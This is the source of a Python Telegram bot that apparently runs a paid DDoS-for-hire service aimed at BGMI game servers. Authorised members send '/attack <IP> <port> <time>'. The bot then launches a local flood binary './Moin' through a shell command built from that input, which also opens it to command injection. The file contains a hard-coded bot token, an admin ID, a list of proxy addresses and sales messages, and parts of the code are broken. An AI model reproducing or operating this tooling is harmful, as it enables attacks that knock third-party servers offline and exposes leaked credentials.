import telebot
import subprocess
import requests
import datetime
import os

    
bot = telebot.TeleBot('7226506506:AAFAjhS3PI41gnjJqzia7s9YB4vAc27s_sI')
admin_id = ["6223399261"]


USER_FILE = "users.txt"
LOG_FILE = "log.txt"


PROXIES = [
"https://192.73.244.36:80",
"https://198.49.68.80:80",
"https://148.72.140.24:30127",
"https://209.97.150.167:8080",
"https://159.65.245.255:80",
"https://162.223.94.164:80",
"https://216.137.184.253:80",
"https://35.185.196.38:3128",
"https://172.96.117.205:38001",
"https://50.175.212.77:80",
"https://50.173.182.90:80",
"https://50.172.75.127:80",
"https://50.223.239.167:80",
"https://50.171.122.30:80",
"https://50.223.246.237:80",
"https://50.223.239.175:80",
"https://50.222.245.40:80",
"https://50.223.239.177:80",
"https://50.222.245.41:80",
"https://50.174.7.158:80",
"https://50.168.72.122:80",
"https://50.171.187.50:80",
"https://50.223.239.168:80",
"https://50.223.239.161:80",
"https://50.223.239.160:80",
"https://50.171.187.51:80",
"https://50.169.135.10:80",
"https://50.207.199.86:80",
"https://50.217.226.44:80",
"https://50.172.75.122:80",
"https://50.174.145.9:80",
"https://50.172.75.120:80",
"https://50.221.230.186:80",
"https://50.222.245.47:80",
"https://198.199.86.11:8080",
"https://54.67.125.45:3128",
"https://44.195.247.145:80",
"https://13.59.156.167:3128",
"https://18.223.25.15:80",
"https://3.212.148.199:3128",
"https://3.21.101.158:3128",
"https://52.73.224.54:3128",
"https://44.219.175.186:80",
"https://50.174.7.153:80",
"https://50.168.163.179:80",
"https://50.174.7.154:80",
"https://50.217.226.45:80",
"https://50.221.74.130:80",
"https://50.168.72.118:80",
"https://50.207.199.87:80",
"https://50.217.226.40:80",
"https://50.168.72.115:80",
"https://50.174.7.155:80",
"https://50.217.226.46:80",
"https://50.168.7.250:80",
"https://50.218.204.103:80",
"https://50.145.24.176:80",
"https://50.223.239.173:80",
"https://50.145.24.181:80",
"https://24.205.201.186:80",
"https://13.56.163.250:3128",
"https://47.251.43.115:33333",
"https://198.44.255.5:80",
"https://162.223.94.166:80",
"https://198.199.70.20:31028",
"https://66.191.31.158:80",
"https://13.56.192.187:80",
"https://172.183.241.1:8080",
"https://50.222.245.42:80",
"https://50.168.163.182:80",
"https://50.168.72.119:80",
"https://50.239.72.19:80",
"https://68.185.57.66:80",
"https://50.145.24.186:80",
"https://50.144.161.162:80",
"https://72.169.67.109:87",
"https://50.223.239.190:80",
"https://50.223.239.185:80",
"https://50.168.72.116:80",
"https://50.231.172.74:80",
"https://50.174.145.14:80",
"https://50.222.245.45:80",
"https://50.222.245.46:80",
"https://50.144.161.167:80",
"https://50.223.246.226:80",
"https://50.172.75.124:80",
"https://50.168.163.176:80",
"https://50.174.145.10:80",
"https://50.169.37.50:80",
"https://32.223.6.94:80",
"https://50.172.39.98:80",
"https://50.175.212.79:80",
"https://50.174.145.13:80",
"https://154.208.10.126:80",
"https://50.172.75.123:80",
"https://50.174.7.162:80",
"https://3.12.144.146:3128",
"https://50.239.72.17:80",
"https://50.174.7.156:80",
"https://50.168.163.180:80",
"https://50.231.110.26:80",
"https://50.168.163.178:80",
"https://50.174.7.157:80",
"https://50.217.226.43:80",
"https://50.207.199.82:80",
"https://50.168.72.113:80",
"https://50.207.199.83:80",
"https://50.202.75.26:80",
"https://50.168.163.166:80",
"https://50.175.212.76:80",
"https://34.23.45.223:80",
"https://12.186.205.122:80",
"https://50.230.222.202:80",
"https://50.144.166.226:80",
"https://50.222.245.43:80",
"https://50.222.245.50:80",
"https://50.223.239.194:80",
"https://50.144.168.74:80",
"https://50.171.177.124:80",
"https://50.223.239.191:80",
"https://50.223.38.6:80",
"https://4.155.2.13:9480",
"https://50.174.7.152:80",
"https://50.168.163.177:80",
"https://50.168.72.117:80",
"https://68.178.203.69:8899",
"https://50.239.72.18:80",
"https://50.217.226.47:80",
"https://50.207.199.84:80",
"https://50.174.145.8:80",
"https://50.168.72.114:80",
"https://50.168.163.183:80",
"https://50.207.199.81:80",
"https://50.168.163.181:80",
"https://50.239.72.16:80",
"https://50.223.239.165:80",
"https://50.217.226.42:80",
"https://50.174.7.159:80",
"https://103.170.155.104:3128",
"https://162.240.75.37:80",
"https://137.184.121.54:80",
"https://160.72.98.165:3128",
"https://192.210.236.54:3128",
"https://50.223.239.183:80",
"https://156.239.48.42:3128",
"https://69.58.9.119:7189",
"https://173.214.176.84:6055",
"https://104.165.127.25:3128",
"https://43.245.116.203:6718",
"https://156.239.53.234:3128",
"https://157.52.233.50:5677",
"https://104.165.169.254:3128",
"https://104.165.169.218:3128",
"https://45.41.160.253:6235",
"https://134.73.70.39:6283",
"https://192.186.176.160:8210",
"https://104.207.45.131:3128",
"https://161.123.93.27:5757",
"https://172.245.157.99:6684",
"https://161.123.130.142:5813",
"https://156.239.52.221:3128",
"https://104.207.32.96:3128",
"https://104.165.127.166:3128",
"https://104.165.127.87:3128",
"https://104.207.56.116:3128",
"https://207.244.217.82:6629",
"https://45.141.81.10:6070",
"https://156.239.53.254:3128",
"https://156.239.53.97:3128",
"https://134.73.69.178:6168",
"https://104.207.44.40:3128",
"https://23.228.83.31:5727",
"https://12.163.95.161:8080",
"https://38.170.171.133:5833",
"https://156.239.52.150:3128",
"https://156.239.53.182:3128",
"https://147.124.198.205:6064",
"https://154.16.146.44:80	",
"https://142.111.1.84:5116",
"https://156.239.49.31:3128",
"https://172.245.157.171:6756",
"https://206.206.64.212:6173",
"https://206.206.122.34:5665",
"https://107.179.114.75:5848",
"https://156.239.52.138:3128",
"https://156.239.50.229:3128",
"https://104.207.35.225:3128",
"https://107.173.137.249:6503",
"https://134.73.64.15:6300",
"https://156.239.49.201:3128",
"https://134.73.65.97:6649"
]

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip(): 
                    user_info = line.split()
                    if len(user_info) == 2:


                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()


def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")



def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = ". No data found ."


            else:
                file.truncate(0)
                response = " successfully ✅"
    except FileNotFoundError:
        response = "No  found."
    return response

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"


    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(content_types=['luchi'])
def welcome_start(message):
    response = "Welcome to our chat!"
    try:
        bot.reply_to(message, response)
    except telebot.apihelper.ApiTelegramException as e:
        if e.error_code == 400 and e.description == 'Bad Request: message to be replied not found':
            print(f"Error: Message to be replied not found. Skipping...")
        else:
            raise


@bot.message_handler(commands=['a'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()


        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"𝗛𝗘𝗬 𝗕𝗢𝗧 𝗢𝗪𝗡𝗘𝗥👋\n\n 𝘂𝘀𝗲𝗿 --> {user_to_add} \n𝗔𝗗𝗗𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗟𝗬 ❤️ \n\n"
            else:
                response = "𝗔𝗹𝗿𝗲𝗮𝗱𝘆❌ 𝗲𝘅𝗶𝘀𝘁 𝗮𝗻𝗱 𝘂𝘀𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗯𝗼𝘁"
        else:
            response = "❌ ＥＲＲＯＲ ❌"
    else:
        response = "ᴡᴇ ᴀʀᴇ ꜱᴏʀʀʏ ʏᴏᴜ ᴀʀᴇ ɴᴏᴛ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ"

    bot.reply_to(message, response)



@bot.message_handler(commands=['r'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"𝘂𝘀𝗲𝗿 --> {user_to_remove} 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗥𝗘𝗠𝗢𝗩𝗘𝗗 𝗧𝗛𝗘 𝗨𝗦𝗘𝗥 ✅"
            else:
                response = f"𝗧𝗛𝗜𝗦 𝗨𝗦𝗘𝗥 𝗜𝗗 𝗗𝗢𝗘𝗦 𝗡𝗢𝗧 𝗘𝗫𝗜𝗦𝗧 𝗢𝗡 𝗬𝗢𝗨𝗥 𝗕𝗢𝗧"
        else:
            response = '''𝗘𝗿𝗿𝗼𝗿 :- 𝗣𝗹𝗲𝗮𝘀𝗲 𝘁𝗿𝘆 --> /𝗿 <𝘂𝘀𝗲𝗿_𝗶𝗱>'''
    else:
        response = "𝗪𝗘 𝗔𝗥𝗘 𝗦𝗢𝗥𝗥𝗬 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗢𝗪𝗡𝗘𝗥 𝗢𝗙 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧 . 𝗢𝗪𝗡𝗘𝗥 𝗜𝗦 - @ASTAMODS07"

    bot.reply_to(message, response)


@bot.message_handler(commands=['all'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "ᴺᴼ ᵁˢᴱᴿ ᴰᴬᵀᴬ ᶠᴼᵁᴺᴰ"
        except FileNotFoundError:
            response = "ᴺᴼ ᵁˢᴱᴿ ᴰᴬᵀᴬ ᶠᴼᵁᴺᴰ"
    else:
        response = "𝗪𝗘 𝗔𝗥𝗘 𝗦𝗢𝗥𝗥𝗬 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗢𝗪𝗡𝗘𝗥 𝗢𝗙 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧 . 𝗢𝗪𝗡𝗘𝗥 𝗜𝗦 - @ASTAMODS07"
    bot.reply_to(message, response)



@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝗧𝗚 𝗜𝗗 :- {user_id}"
    bot.reply_to(message, response)

def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"⚡ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗗𝗗𝗢𝗦 ⚡\n\n🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗬 :- {username} \n🚀 𝗧𝗔𝗥𝗚𝗘𝗧 :- {target}\n🎯 𝗣𝗢𝗥𝗧 :- {port}\n⏰ 𝗧𝗜𝗠𝗘𝗢𝗨𝗧 :- {time} \n🇮🇳 𝗚𝗔𝗠𝗘 𝗕𝗚𝗠𝗜\n\n❄️ 𝗟𝗘𝗧 𝗧𝗛𝗘 𝗦𝗘𝗥𝗩𝗘𝗥 𝗙𝗥𝗘𝗘𝗭𝗘\n"
    bot.reply_to(message, response)

bgmi_cooldown = {}

COOLDOWN_TIME =0


@bot.message_handler(commands=['attack'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:

        if user_id not in admin_id:
 
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "⏰ 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 ⏰"
                bot.reply_to(message, response)
                return

            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  
            target = command[1]
            port = int(command[2]) 
            time = int(command[3])  
            if time > 300:
                response = "𝗠𝗔𝗞𝗘 𝗦𝗨𝗥𝗘 𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗘𝗡𝗧𝗘𝗥𝗘𝗗 𝗧𝗛𝗘 𝗧𝗜𝗠𝗘 𝗨𝗡𝗗𝗘𝗥 𝟯𝟬𝟬 𝗦𝗘𝗖𝗢𝗡𝗗𝗦"
            else:
                record_command_logs(user_id, '/attack', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./Moin {target} {port} {time} 300"
                subprocess.run(full_command, shell=True)
                response = f"💣 𝗔𝗧𝗧𝗔𝗖𝗞 𝗙𝗜𝗡𝗜𝗦𝗛𝗘𝗗 💣\n𝗧𝗔𝗥𝗚𝗘𝗧 :- {target}\n🎯 𝗣𝗢𝗥𝗧 :- {port}\n⏰ 𝗧𝗜𝗠𝗘𝗢𝗨𝗧 :- {time} \n🇮🇳 𝗚𝗔𝗠𝗘 𝗕𝗚𝗠𝗜\n\n❄️ 𝗦𝗘𝗥𝗩𝗘𝗥 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗙𝗥𝗘𝗘𝗭𝗘 𝗔𝗦 𝗣𝗘𝗥 𝗧𝗛𝗘 𝗧𝗜𝗠𝗘\n\n"
        else:
            response = "𝗘𝗡𝗧𝗘𝗥 𝗧𝗛𝗘 𝗔𝗧𝗧𝗔𝗖𝗞\n𝗟𝗜𝗞𝗘 :- /attack 𝟮𝟬.𝟮𝟯𝟱.𝟭𝟳𝟮 𝟭𝟴𝟲𝟭𝟳 𝟮𝟰𝟬\n𝗟𝗜𝗞𝗘 :- /attack 𝗧𝗔𝗥𝗚𝗘𝗧 𝗣𝗢𝗥𝗧 𝗧𝗜𝗠𝗘\n\n"
    else:
        response = "🚫 𝗬𝗢𝗨 𝗛𝗔𝗩𝗘𝗡'𝗧 𝗣𝗨𝗥𝗖𝗛𝗔𝗦𝗘 𝗠𝗘𝗠𝗕𝗘𝗥𝗦𝗛𝗜𝗣 𝗢𝗙 𝗕𝗢𝗧. 𝗧𝗢 𝗕𝗨𝗬 𝗗𝗠 - @ASTAMODS07"

    bot.reply_to(message, response)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''𝗪𝗘𝗟𝗖𝗢𝗠𝗘 {𝐮𝐬𝐞𝐫_𝐧𝐚𝐦𝐞} 𝗧𝗢 𝗠𝗬 𝗔𝗜𝗭𝗘𝗡 𝗗𝗗𝗢𝗦 ☠️ 𝗕𝗢𝗧 :-\n𝗙𝗢𝗥 𝗠𝗢𝗥𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 𝗧𝗥𝗬 𝗧𝗢 𝗥𝗨𝗡 𝗧𝗛𝗜𝗦 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 : /attack\n'''
    bot.reply_to(message, response)
    
@bot.message_handler(commands=['owner'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''@ASTAMODS07'''
    bot.reply_to(message, response)

bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)